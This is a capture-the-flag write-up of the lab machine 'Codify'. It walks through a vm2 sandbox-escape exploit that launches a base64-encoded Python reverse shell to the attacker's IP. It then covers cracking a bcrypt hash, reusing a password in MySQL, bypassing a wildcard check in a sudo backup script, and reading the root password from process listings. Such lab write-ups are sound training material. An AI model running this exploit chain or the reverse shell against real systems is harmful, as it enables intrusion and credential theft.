# PRE-SCAN

DNS resolution in `/etc/hosts`

```
10.10.11.239 codify.htb
```

## NMAP 


```bash
❯ sudo nmap 10.10.11.239 -O -sC 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-26 11:29 CET
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http
|_http-title: Codify
3000/tcp open  ppp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/26%OT=22%CT=1%CU=44066%PV=Y%DS=2%DC=I%G=Y%TM=658AAB
OS:12%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST
OS:11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.24 seconds
```

# USER

The main site at `codify.htb` shows some important information.
In particulare at `/about` we can see a useful stuff:


```txt
The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.
```

The lirbary vm2 used as sandobox for node js contains some important vulnerbailities and its updates have been interrupted. It contains container escame RCE.

CVE: 
- https://github.com/advisories/GHSA-cchq-frgv-rjh5
- https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9

In the `/editor` section we can insert javascript that it is interpreted by the vm2.

rce:

base64 decoded python shell:


```bash
export RHOST="10.10.16.48";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```


```javascript
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('echo ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNi40OCI7ZXhwb3J0IFJQT1JUPTEyMzQ7cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigic2giKScK | base64 -d | /bin/bash'); }
            )
        }
    }
};
p.then();
```


Now we have 2 users shown in `/etc/passwd` called

- josuha 
- _laurel

By searching some information for the user joasua which contains the user flag we can maybe retrivie something. Let's run this one:

```bash
find / -iname '*.*' -exec grep -i joshua {} \; -print 2> /dev/null
```

Output:

```text
T5Tite format 3@  .WJ
   tableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)       tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
Gjoshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

joshua  users
             ickets
r]rh%%Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open ;wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```

So we found a sql file under `/var/www/contact/tickets.db` path. We can see some important info of `sqlite3` db and we can see a bcrypt password. Let's try to crack it using hashcat.

```bash
hashcat -a 0 -m 3200 '2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' ~/SecLists/rockyou.txt
```

craked:

```txt
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```

we can now `su joshua` and insert the cracked password.


# ROOT

We have mariadb which is up and running on our machine.
We can try to login in mysql db using the same password and the same user.

`mysql -h 0.0.0.0 -P 3306 -pspongebob1 -ujoshua`

We have a table called user which contains password for root and dor joshua.

```sql
select * from user;

+-----------+-------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+---------
-------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
| Host      | User        | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_vie
w_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | is_role | default_role | max_statement_time |
+-----------+-------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+---------
-------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
| localhost | mariadb.sys |                                           | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N       
       | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password |                                           | Y                | N       |              |           0.000000 |
| localhost | root        | *4ECCEBD05161B6782081E970D9D2C72138197218 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y       
       | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *4ECCEBD05161B6782081E970D9D2C72138197218 | N                | N       |              |           0.000000 |
| 127.0.0.1 | root        | *4ECCEBD05161B6782081E970D9D2C72138197218 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y       
       | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *4ECCEBD05161B6782081E970D9D2C72138197218 | N                | N       |              |           0.000000 |
| %         | passbolt    | *63DA7233CC5151B814CBEC5AF8B3EAC43347A203 | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N       
       | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *63DA7233CC5151B814CBEC5AF8B3EAC43347A203 | N                | N       |              |           0.000000 |
| %         | joshua      | *323A5EDCBFA127CC75F6C155457533AC1D5C4921 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y       
       | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *323A5EDCBFA127CC75F6C155457533AC1D5C4921 | N                | N       |              |           0.000000 |
| %         | root        | *4ECCEBD05161B6782081E970D9D2C72138197218 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y       
       | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *4ECCEBD05161B6782081E970D9D2C72138197218 | N                | N       |              |           0.000000 |
+-----------+-------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+---------
-------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
```

The format seems to be a `sha-1` but after few attempts ofc cracking the passwords seems to be secured well.

We can run `smart-linenum.sh` and we find this useful information.

```bash
sudo -l 

Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Of course in order to obtain runnnable sudo files you must insert joshua password's
.

Let's try to see `/opt/scripts/mysql-backup.sh` file:


```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

# first injection use * option

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The script is very clear, it accept a password in input for the root, and if its right then it exports some mysql tables into the backups directory which is not readble in any way by us.
Of course neither root creds file is not accessible.

we can launch the script with:


```bash
sudo /opt/scripts/mysql-backup.sh
```

After a considerable amount of ours and following this link about bash script attacks:

- https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/ShellScriptSecurity/ShellScriptSecurity.html

I managed that there is a very simple bypass.

Firstly, I thouuth that since there is a echo after read I could try to append some option for echo command.
And it works:

In fact appending `-e \x3c` let the 3c hex to be interpreted by echo command has a password.
This is interesting but its not the way to bypass this check. I found some useful bypass on the apple link I already posted, in particular I looked at `Injection Attacks Section` but it did not worked bueacse the if conditional in my shell script used `if [[ $DB_PASS == $USER_PASS ]]; then` double `[[]]` instead of single ones. This attack is not applicable.
After some time I managed that inserting a single wildcard bash character is enough to bypass the check:

in fact inserting `*` as char when it asks for user password let's us to bypass the check:


```bash
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: `sys`
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

As we can see there is a database called `sys`.
So based on the script, a file called `/var/backups/mysql/sys.sql.gz` should be created when the script runs.
The next idea is simple, i tried the `PATH` trick to induce the script to call my binary/bash instead of those ones located under `/usr/bin`.
Of course it din't worked beacuse i did not look at the bash script accourately enough. It uses absoulute path like: `/usr/bin/gzip`
So this atttack is not applicable.
Another useful attack still based on apple security link, could have be to create a c binary which should be suffecientily fast to read the file before of the permission changing done with:

```bash
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
```

This din't worked and the solution is much simplier. What if i run the script and i can interecept the string with `ps aux`:

```bash
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
```

which should show me the `$DB_PASS` for root user which can be useful? 
To achieve this task we can use `pspy64` which is a linux process tracker and run


`sudo /opt/scripts/mysql-backup.sh`

Of course we need to bypass the check for root password with the wildcard but then we find in `pspy64` the following output:


```bash
2023/12/31 11:29:37 CMD: UID=0     PID=357946 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:37 CMD: UID=0     PID=357947 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:37 CMD: UID=0     PID=357948 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:37 CMD: UID=0     PID=357949 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:38 CMD: UID=0     PID=357953 | /usr/bin/echo Backing up database: mysql 
2023/12/31 11:29:38 CMD: UID=0     PID=357955 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:38 CMD: UID=0     PID=357954 | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql 
2023/12/31 11:29:38 CMD: UID=0     PID=357983 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:38 CMD: UID=0     PID=357984 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:38 CMD: UID=0     PID=357985 | /usr/bin/gzip 
2023/12/31 11:29:39 CMD: UID=0     PID=358036 | 
2023/12/31 11:29:39 CMD: UID=0     PID=358037 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/12/31 11:29:39 CMD: UID=0     PID=358038 | /usr/bin/chown root:sys-adm /var/backups/mysql 
2023/12/31 11:29:39 CMD: UID=0     PID=358039 | /usr/bin/chmod 774 -R /var/backups/mysql 
2023/12/31 11:29:39 CMD: UID=0     PID=358040 | /bin/bash /opt/scripts/mysql-backup.sh 
```


```bash
2023/12/31 11:29:38 CMD: UID=0     PID=357954 | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql 
```

using `kljh12k3jhaskjh12kjh3` has passwor when doing `su` form `joshua` let's us to become root.